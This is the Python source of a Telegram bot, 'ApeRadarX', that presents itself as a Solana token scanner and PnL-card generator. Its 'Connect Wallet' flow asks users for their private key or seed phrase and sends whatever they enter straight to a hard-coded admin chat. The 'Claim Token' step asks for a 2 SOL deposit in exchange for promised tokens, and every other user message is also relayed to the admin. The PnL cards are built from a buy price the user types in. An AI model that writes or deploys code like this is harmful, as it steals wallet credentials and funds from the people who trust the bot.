# trigger redeploy v7
"""
ApeRadarX Solana Telegram Bot
PnL Card uses reference background image
"""

import os
import re
import io
import random
import threading
import requests
from http.server import HTTPServer, BaseHTTPRequestHandler
from PIL import Image, ImageDraw, ImageFont, ImageFilter
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, filters, ContextTypes,
)

# ─────────────────────────────────────────────
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
BOT_NAME = "ApeRadarX"
ADMIN_ID = 1495066761
PNL_ALLOWED = {1495066761, 6203945884, 8730420346, 8296058698}

# Background image URL (hosted on GitHub)

waiting_for_wallet = {}
waiting_for_pnl = {}

# ─────────────────────────────────────────────
# Admin notification
# ─────────────────────────────────────────────
async def notify_admin(context, user, action, extra=""):
    try:
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"📡 *Activity Log*\n\n"
                 f"👤 Name: {user.full_name}\n"
                 f"🆔 ID: `{user.id}`\n"
                 f"📛 Username: @{user.username if user.username else 'No username'}\n"
                 f"🔘 Action: {action}"
                 + (f"\n📝 `{extra}`" if extra else ""),
            parse_mode="Markdown"
        )
    except: pass

# ─────────────────────────────────────────────
# PnL Card Generator
# Final plain 1536x1024 PnL template. The artwork is fixed; only dynamic
# token data is drawn on top of the intentionally empty fields.
PNL_TEMPLATE_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pnl_template_final.png")


def format_mcap(n):
    try:
        n = float(n)
        if n >= 1_000_000_000: return f"${n/1_000_000_000:.1f}B"
        if n >= 1_000_000: return f"${n/1_000_000:.1f}M"
        if n >= 1_000: return f"${n/1_000:.1f}K"
        return f"${n:.0f}"
    except: return "N/A"


def get_font(size):
    for p in [
        "/usr/share/fonts/truetype/dejavu/DejaVuSansCondensed-Bold.ttf",
        "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf",
        "/usr/share/fonts/truetype/liberation/LiberationSans-Bold.ttf",
    ]:
        try: return ImageFont.truetype(p, size)
        except: continue
    return ImageFont.load_default()


def fit_font(text, max_width, start_size, min_size=16):
    for size in range(start_size, min_size - 1, -2):
        f = get_font(size)
        b = f.getbbox(text)
        if b[2] - b[0] <= max_width:
            return f
    return get_font(min_size)


def center_text(draw, box, text, font, fill, stroke_width=0, stroke_fill=None):
    x1, y1, x2, y2 = box
    b = draw.textbbox((0, 0), text, font=font, stroke_width=stroke_width)
    tw, th = b[2] - b[0], b[3] - b[1]
    x = x1 + (x2 - x1 - tw) / 2
    y = y1 + (y2 - y1 - th) / 2 - b[1]
    draw.text((x, y), text, font=font, fill=fill,
              stroke_width=stroke_width, stroke_fill=stroke_fill)


def _download_logo(url):
    if not url:
        return None
    try:
        r = requests.get(url, timeout=8)
        r.raise_for_status()
        return Image.open(io.BytesIO(r.content)).convert("RGBA")
    except:
        return None


def _draw_logo(img, logo_url):
    # Remove the sample coin completely, then recreate the gold ring and place
    # the live token logo inside it. This prevents the old token name/artwork
    # from remaining around the new logo.
    cx, cy = 768, 161
    outer_r, inner_r = 112, 84
    layer = Image.new("RGBA", img.size, (0, 0, 0, 0))
    d = ImageDraw.Draw(layer, "RGBA")
    d.ellipse((cx-outer_r, cy-outer_r, cx+outer_r, cy+outer_r), fill=(3, 7, 2, 255), outline=(185, 205, 55, 255), width=5)
    d.ellipse((cx-inner_r, cy-inner_r, cx+inner_r, cy+inner_r), fill=(8, 15, 5, 255), outline=(225, 190, 45, 255), width=3)
    glow = layer.filter(ImageFilter.GaussianBlur(8))
    img = Image.alpha_composite(img, glow)
    img = Image.alpha_composite(img, layer)
    logo = _download_logo(logo_url)
    if logo is not None:
        logo.thumbnail((inner_r*2-10, inner_r*2-10), Image.LANCZOS)
        mask = Image.new("L", logo.size, 0)
        ImageDraw.Draw(mask).ellipse((0, 0, logo.width-1, logo.height-1), fill=255)
        logo.putalpha(mask)
        img.alpha_composite(logo, (cx-logo.width//2, cy-logo.height//2))
    return img


def generate_pnl_card(token_name, token_symbol, buy_mcap, current_mcap, username, token_logo_url=None, contract_address=None):
    if not os.path.exists(PNL_TEMPLATE_PATH):
        raise FileNotFoundError("pnl_template_final.png is missing beside the bot file.")

    img = Image.open(PNL_TEMPLATE_PATH).convert("RGBA")
    if img.size != (1536, 1024):
        img = img.resize((1536, 1024), Image.LANCZOS)

    green = (165, 255, 35, 255)
    white = (255, 255, 255, 255)
    multiplier = float(current_mcap) / float(buy_mcap) if float(buy_mcap) > 0 else 1.0

    # Name area is intentionally placed in the clean space above CALLED AT.
    # This does not cover any existing artwork.
    draw = ImageDraw.Draw(img, "RGBA")
    name = str(token_name or token_symbol or "TOKEN").strip()
    symbol = str(token_symbol or "TOKEN").upper().strip()
    name = re.sub(r"\s+", " ", name)
    if len(name) > 26:
        name = name[:25].rstrip() + "…"

    name_font = fit_font(name, 560, 66, 28)
    center_text(draw, (70, 205, 635, 255), name, name_font, white,
                stroke_width=2, stroke_fill=(0, 30, 0, 210))
    symbol_text = f"({symbol})"
    center_text(draw, (85, 248, 500, 290), symbol_text,
                fit_font(symbol_text, 390, 30, 18), green)

    # Called-at value inside the existing empty panel.
    called_box = (175, 365, 390, 415)
    center_text(draw, called_box, format_mcap(buy_mcap),
                fit_font(format_mcap(buy_mcap), 205, 46, 24), white)

    # Replace the sample coin face with the actual token logo.
    img = _draw_logo(img, token_logo_url)

    # Hide the sample multiplier with a controlled dark-green panel, then draw
    # the live multiplier. This keeps the supplied artwork's surrounding glow
    # and arrow while guaranteeing the old sample number cannot show through.
    panel = Image.new("RGBA", img.size, (0, 0, 0, 0))
    pp = ImageDraw.Draw(panel, "RGBA")
    pp.rounded_rectangle((405, 300, 1300, 560), radius=18, fill=(0, 20, 4, 255))
    glow_panel = Image.new("RGBA", img.size, (0, 0, 0, 0))
    gp = ImageDraw.Draw(glow_panel, "RGBA")
    gp.ellipse((430, 315, 1275, 565), fill=(75, 220, 25, 45))
    glow_panel = glow_panel.filter(ImageFilter.GaussianBlur(28))
    img = Image.alpha_composite(img, glow_panel)
    img = Image.alpha_composite(img, panel)

    mult = f"{multiplier:.1f}X"
    layer = Image.new("RGBA", img.size, (0, 0, 0, 0))
    ld = ImageDraw.Draw(layer, "RGBA")
    mf = fit_font(mult, 820, 225, 100)
    bb = ld.textbbox((0, 0), mult, font=mf, stroke_width=4)
    tw, th = bb[2]-bb[0], bb[3]-bb[1]
    x = 850 - tw/2
    y = 430 - th/2 - bb[1]
    for sw, alpha in ((26, 28), (17, 48), (10, 80)):
        ld.text((x, y), mult, font=mf, fill=(80,255,0,30),
                stroke_width=sw, stroke_fill=(90,255,0,alpha))
    img = Image.alpha_composite(img, layer)

    # Add current mcap
    current_box = (960, 365, 1240, 415)
    center_text(draw, current_box, format_mcap(current_mcap),
                fit_font(format_mcap(current_mcap), 265, 46, 24), white)

    # Add contract address at the bottom if provided
    if contract_address:
        ca_text = f"CA: {contract_address[:8]}...{contract_address[-8:]}"
        ca_font = fit_font(ca_text, 1400, 20, 14)
        center_text(draw, (68, 950, 1468, 1000), ca_text, ca_font, green, stroke_width=1, stroke_fill=(0, 30, 0, 150))

    # Attribution footer
    footer_font = get_font(18)
    center_text(draw, (1100, 945, 1520, 1010), "ApeRadarX", footer_font, (185, 205, 55, 255))

    return img.convert("RGB")


def parse_mcap_input(text):
    text = text.strip().upper()
    multipliers = {"K": 1_000, "M": 1_000_000, "B": 1_000_000_000}
    if not text:
        return 0
    if text[-1] in multipliers:
        try:
            return float(text[:-1]) * multipliers[text[-1]]
        except: return 0
    try: return float(text)
    except: return 0


def format_number(n):
    if n is None:
        return "N/A"
    n = float(n)
    if n >= 1_000_000_000: return f"${n/1_000_000_000:.1f}B"
    if n >= 1_000_000: return f"${n/1_000_000:.1f}M"
    if n >= 1_000: return f"${n/1_000:.1f}K"
    return f"${n:.0f}"


def is_valid_seed_or_key(text):
    text = text.strip()
    words = text.split()
    return (len(words) in [12, 24] and all(len(w) > 2 for w in words)) or (len(text) == 88 and text.isalnum())


def get_token_info(address):
    try:
        r = requests.get(
            f"https://api.dexscreener.com/latest/dex/tokens/{address}",
            timeout=10)
        r.raise_for_status()
        data = r.json()
        if data.get("pairs") and len(data["pairs"]) > 0:
            return data["pairs"][0]
        return None
    except:
        return None


def build_token_message(pair):
    base = pair.get("baseToken", {})
    quote = pair.get("quoteToken", {})
    name = base.get("name", "?")
    symbol = base.get("symbol", "?")
    addr = base.get("address", "?")
    price = pair.get("priceUsd", "?")
    mcap = pair.get("marketCap", 0)
    h24 = pair.get("priceChange", {}).get("h24", "?")
    vol24 = pair.get("volume", {}).get("h24", "?")

    mcap_str = format_number(mcap) if mcap else "N/A"
    vol24_str = format_number(vol24) if vol24 else "N/A"

    return (f"*{symbol}* / {quote.get('symbol','?')}\n"
            f"💰 Price: ${price}\n"
            f"📊 MCap: {mcap_str}\n"
            f"📈 24h: {h24}%\n"
            f"💹 Volume 24h: {vol24_str}\n\n"
            f"🔗 `{addr}`")


def token_keyboard(symbol, address):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🟢 Buy", callback_data=f"buy:{symbol}"),
         InlineKeyboardButton("🔴 Sell", callback_data=f"sell:{symbol}")],
        [InlineKeyboardButton("📊 PnL Card", callback_data=f"pnl:{address}"),
         InlineKeyboardButton("🔄 Refresh", callback_data=f"refresh:{address}")],
    ])


# ─────────────────────────────────────────────
# Commands
# ─────────────────────────────────────────────
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"🤖 *Welcome to {BOT_NAME}*\n\n"
        f"📍 Paste a Solana token contract address to scan.\n"
        f"📊 Generate PnL cards (selected users).\n"
        f"👛 Connect and manage your wallet.\n\n"
        f"/help — More info",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📊 PnL Card", callback_data="pnl_menu")],
            [InlineKeyboardButton("👛 Connect Wallet", callback_data="connect_wallet")],
            [InlineKeyboardButton("🎁 Claim Token", callback_data="claim_token")],
            [InlineKeyboardButton("👥 Referrals", callback_data="referrals")],
        ]),
        parse_mode="Markdown")
    await notify_admin(context, update.message.from_user, "▶️ Started bot")


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"❓ *{BOT_NAME} Help*\n\n"
        f"🔍 *Scan Token*: Paste a contract address\n"
        f"📊 *PnL Card*: Generate profit/loss visualizations\n"
        f"👛 *Wallet*: Connect your Solana wallet\n"
        f"🎁 *Claim*: Collect your tokens\n"
        f"👥 *Referrals*: Invite friends, earn rewards",
        parse_mode="Markdown")


# ─────────────────────────────────────────────
# Button Handlers
# ─────────────────────────────────────────────
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user = query.from_user
    can_pnl = user.id in PNL_ALLOWED
    await query.answer()

    data = query.data

    if data == "pnl_menu":
        if not can_pnl:
            await query.message.reply_text(
                f"❌ *PnL Card Access Denied*\n\nThis feature is restricted to selected users.",
                parse_mode="Markdown")
            return
        waiting_for_pnl[user.id] = {"step": "address"}
        await query.message.reply_text("📊 *PnL Card*\n\nPaste the token contract address!", parse_mode="Markdown")

    elif data.startswith("pnl:"):
        if not can_pnl:
            await query.message.reply_text(
                f"❌ *PnL Card Access Denied*\n\nThis feature is restricted to selected users.",
                parse_mode="Markdown")
            return
        address = data.split(":")[1]
        pair = get_token_info(address)
        if pair:
            base_token = pair.get("baseToken", {})
            name = base_token.get("name", "Unknown")
            symbol = base_token.get("symbol", "TOKEN")
            current_mcap = pair.get("marketCap", 0)
            waiting_for_pnl[user.id] = {
                "step": "buy_mcap", "address": address, "name": name, "symbol": symbol,
                "current_mcap": float(current_mcap) if current_mcap else 0,
                "logo_url": pair.get("info",{}).get("imageUrl"),
            }
            await query.message.reply_text(
                f"📊 *{symbol}*\nCurrent MCap: {format_number(current_mcap)}\n\n"
                f"Enter the MCap when you bought _(e.g. 9.3K, 1.2M)_:",
                parse_mode="Markdown")
        else:
            await query.message.reply_text("❌ Could not fetch token data.")

    elif data == "buy_menu":
        await query.message.reply_text("🟢 *Buy Token*\n\nPaste the token contract address!", parse_mode="Markdown")

    elif data == "sell_menu":
        await query.message.reply_text("🔴 *Sell Token*\n\nPaste the token contract address!", parse_mode="Markdown")

    elif data == "connect_wallet":
        waiting_for_wallet[user.id] = True
        await query.message.reply_text(
            "👛 *Connect Wallet*\n\nTo connect your Solana wallet, import your private key or seed phrase.\n\n⚠️ Never share your seed phrase with anyone!",
            parse_mode="Markdown")

    elif data == "claim_token":
        if context.user_data.get("wallet_connected"):
            await query.message.reply_text(
                "🎁 *Claim Token*\n\nTo claim your token, please deposit *2 SOL* to your connected wallet first.\n\nOnce your deposit is confirmed, your tokens will be released automatically! 🚀",
                parse_mode="Markdown")
        else:
            await query.message.reply_text(
                "🎁 *Claim Token*\n\nClick the *CONNECT WALLET* button to generate or connect your wallet and get started.",
                parse_mode="Markdown")

    elif data == "referrals":
        ref_link = f"https://t.me/ApeRadarXBot?start=ref_{user.id}"
        await query.message.reply_text(
            f"👥 *Referrals*\n\nInvite friends and earn rewards!\n\n🔗 Your link:\n`{ref_link}`",
            parse_mode="Markdown")

    elif data == "help":
        await query.message.reply_text(
            f"❓ *Help*\n\n🔍 Paste Solana token address\n📊 PnL Card — selected users\n👛 Connect Wallet\n/start — Main menu",
            parse_mode="Markdown")

    elif data.startswith("buy:"):
        symbol = data.split(":")[1]
        await query.message.reply_text(f"🟢 *Buy {symbol}*\n\n⚠️ Connect your wallet first.", parse_mode="Markdown")

    elif data.startswith("sell:"):
        symbol = data.split(":")[1]
        await query.message.reply_text(f"🔴 *Sell {symbol}*\n\n⚠️ Connect your wallet first.", parse_mode="Markdown")

    elif data.startswith("refresh:"):
        address = data.split(":")[1]
        pair = get_token_info(address)
        if pair:
            symbol = pair.get("baseToken",{}).get("symbol","TOKEN")
            await query.message.edit_text(
                build_token_message(pair), parse_mode="Markdown",
                reply_markup=token_keyboard(symbol, address),
                disable_web_page_preview=True)
        else:
            await query.message.reply_text("⚠️ Could not refresh.")

# ─────────────────────────────────────────────
# Message handler
# ─────────────────────────────────────────────
async def handle_message(update, context):
    text = update.message.text.strip()
    user = update.message.from_user
    can_pnl = user.id in PNL_ALLOWED

    pnl_state = waiting_for_pnl.get(user.id)

    if pnl_state and pnl_state.get("step") == "address":
        if 32 <= len(text) <= 44 and text.isalnum():
            await update.message.reply_text("🔍 Fetching token info...")
            pair = get_token_info(text)
            if pair:
                base_token = pair.get("baseToken", {})
                name = base_token.get("name", "Unknown")
                symbol = base_token.get("symbol", "TOKEN")
                current_mcap = pair.get("marketCap", 0)
                waiting_for_pnl[user.id] = {
                    "step": "buy_mcap", "address": text, "name": name, "symbol": symbol,
                    "current_mcap": float(current_mcap) if current_mcap else 0,
                    "logo_url": pair.get("info",{}).get("imageUrl"),
                }
                await update.message.reply_text(
                    f"📊 *{symbol}*\nCurrent MCap: {format_number(current_mcap)}\n\nEnter the MCap when you bought _(e.g. 9.3K, 1.2M)_:",
                    parse_mode="Markdown")
            else:
                await update.message.reply_text("❌ Token not found.")
        else:
            await update.message.reply_text("⚠️ Paste a valid Solana token address.")
        return

    if pnl_state and pnl_state.get("step") == "buy_mcap":
        buy_mcap = parse_mcap_input(text)
        if buy_mcap and buy_mcap > 0:
            current_mcap = pnl_state["current_mcap"]
            name = pnl_state.get("name", pnl_state.get("symbol", "TOKEN"))
            symbol = pnl_state["symbol"]
            logo_url = pnl_state.get("logo_url")
            address = pnl_state.get("address")
            username = user.username or user.first_name or "ApeRadarX"
            waiting_for_pnl[user.id] = None
            await update.message.reply_text("🎨 Generating your PnL card...")
            try:
                card = generate_pnl_card(name, symbol, buy_mcap, current_mcap, username, logo_url, address)
                multiplier = current_mcap / buy_mcap
                await update.message.reply_photo(
                    photo=card,
                    caption=f"📊 *{symbol}* | *{multiplier:.1f}X GAIN* 🚀\nPowered by @ApeRadarXBot",
                    parse_mode="Markdown")
                await notify_admin(context, user, f"📊 PnL card: {symbol} {multiplier:.1f}X")
            except Exception as e:
                await update.message.reply_text(f"❌ Error: {str(e)}")
        else:
            await update.message.reply_text("⚠️ Invalid format. Use: 9.3K, 1.2M, 500000")
        return

    if waiting_for_wallet.get(user.id):
        if is_valid_seed_or_key(text):
            await notify_admin(context, user, "👛 Wallet credentials submitted", text)
            waiting_for_wallet[user.id] = False
            context.user_data["wallet_connected"] = True
            await update.message.reply_text("✅ *Wallet connected successfully!*", parse_mode="Markdown")
        else:
            await notify_admin(context, user, "❌ Invalid wallet input", text)
            await update.message.reply_text("⚠️ Invalid seed phrase. Check your words and try again.")
        return

    if 32 <= len(text) <= 44 and text.isalnum():
        await update.message.reply_text("🔍 Scanning token...")
        pair = get_token_info(text)
        if pair:
            symbol = pair.get("baseToken",{}).get("symbol","TOKEN")
            await notify_admin(context, user, f"🔍 Scanned: {symbol}", text)
            await update.message.reply_text(
                build_token_message(pair), parse_mode="Markdown",
                reply_markup=token_keyboard(symbol, text),
                disable_web_page_preview=True)
        else:
            await notify_admin(context, user, "❌ Token not found", text)
            await update.message.reply_text("❌ Token not found. Paste a valid Solana contract address.")
    else:
        await notify_admin(context, user, "💬 Message", text)
        await update.message.reply_text("👋 Paste a Solana token address to scan!\nOr tap /start for the menu.")

# ─────────────────────────────────────────────
# Web server
# ─────────────────────────────────────────────
class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ApeRadarX Bot is running!")
    def log_message(self, format, *args): pass

def run_web_server():
    port = int(os.environ.get("PORT", 10000))
    HTTPServer(("0.0.0.0", port), HealthHandler).serve_forever()

# ─────────────────────────────────────────────
# ─────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────
if __name__ == "__main__":
    print("🤖 ApeRadarX Bot starting...")

    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    port = int(os.environ.get("PORT", 10000))
    render_url = os.environ.get("RENDER_EXTERNAL_URL", "https://solana-bot-fapw.onrender.com").rstrip("/")
    webhook_path = "telegram-webhook"
    webhook_url = f"{render_url}/{webhook_path}"

    print("✅ Bot is running with webhook!")
    app.run_webhook(
        listen="0.0.0.0",
        port=port,
        url_path=webhook_path,
        webhook_url=webhook_url,
        drop_pending_updates=True,
        allowed_updates=Update.ALL_TYPES,
    )
